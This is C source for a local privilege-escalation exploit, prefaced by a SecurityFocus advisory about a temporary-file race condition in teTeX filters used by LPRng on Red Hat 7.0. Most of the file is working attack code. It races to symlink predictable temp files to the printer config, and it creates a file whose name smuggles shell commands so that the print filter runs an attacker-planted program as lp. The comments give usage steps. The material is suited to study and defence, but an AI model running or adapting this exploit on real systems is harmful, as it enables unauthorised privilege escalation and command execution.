/*
source: http://www.securityfocus.com/bid/2974/info

teTeX is a TeX distribution for UNIX compatible systems.

A race condition vulnerability exists in the temporary file handling method used by some teTeX filters. The problem exists because in some cases temporary files are created world-writeable with a predictable filename based on the process ID of the filter. If an attacker is able to determine the name of a temporary file used during the program's operation, a symbolic link could be created pointing to a file writeable by the user running the filter.

When the filters are used by an application that runs with elevated privileges such as LPRng, the potential impact of the attack could become more significant. A local attacker could exploit this vulnerability to cause LPRng to execute arbitrary commands with its elevated privileges.
*/

/********************************************************************
Redhat 7.0 (mebe 7.1 ?)

LPRng-3.7.4-23  (and earlier)  +  tetex-1.0.7-7   (and earlier?)

     Insecure tmp file privilege elevation vulnerability.

Allows uid/gid lp  and  root groups on LPRng-3.6.24 and earlier
Please note:

-rwxr-xr-x    1 lp       lp         444472 Jun 14 22:05 /usr/bin/lpq*
-rwxr-xr-x    1 lp       lp         441624 Jun 14 22:05 /usr/bin/lprm*
-rwxr-xr-x    1 lp       lp         459160 Jun 14 22:05 /usr/bin/lpr*
-rwxr-xr-x    1 lp       lp         448120 Jun 14 22:05 /usr/bin/lpstat*
-rwxr-xr-x    1 lp       lp         448320 Jun 14 22:05 /usr/sbin/lpc*

 this program allows trojan code to be planted on the machine it is
 executed on. 

 tmp file handling done badly in helper application (dvi print filter)
 allows modification to lp config files.
 the configuation file is sourced by the master print filter,
 which is itself a shell script, each time something is printed.
 this makes it possible to insert commands into the configuration file
 by creating a special filename to be included in the file that 
 is created. (see the close(open(" thingee )


Redhat Bugzilla reference:-

https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=43342

 --zen-parse 

 requires some fonts get made when its run.
 probably won't be a problem unless someone
 else has tried this exploit.
 just wait 90 days for /var/lib/texmf to clear
 and try again ;]
 or try print something different
 .dvi files are what does the trick.

********************************************************************/

int shake()
{
 int f;
 char r[1000];
 int w;
 f=fopen("/proc/loadavg","r");
 fscanf(f,"%*s %*s %*s %*s %s",r);
 fclose(f);
 w=atoi(r);
 return w;
}
void cow(char *s,char *t,int ofs)
{
 sprintf(s,"/var/lib/texmf/lsR%d.tmp",ofs);
 sprintf(t,"%s/lsR%d.tmp",s,ofs);
}

main()
{
 char s[1000];
 char t[1000];
 int y,i;
 printf("Put the stuff to run as lp:lp in /tmp/hax\n");
 printf("the lpr /usr/share/aspe<tab>/manual.dvi\n");
 printf("when the ! comes up, wait a second, then press control-C.\n\n");
 printf("Then print something.\n\n\n");
 close(open("/var/lib/texmf/cd ..\ncd ..\ncd ..\ncd ..\ncd ..\ncd ..\ncd tmp\nexport PATH=.\nhax\nexit 0",65,0666));
 while(1)
 {
  i=shake();
  for(y=-30;y<0;y++)
  {
   cow(s,t,y+i);
   if(!access(t,0))
   { 
    printf("!\n");
    unlink(t);
    symlink("/var/spool/lpd/lp/postscript.cfg",t);
    sleep(1);
   }
  }
 }
}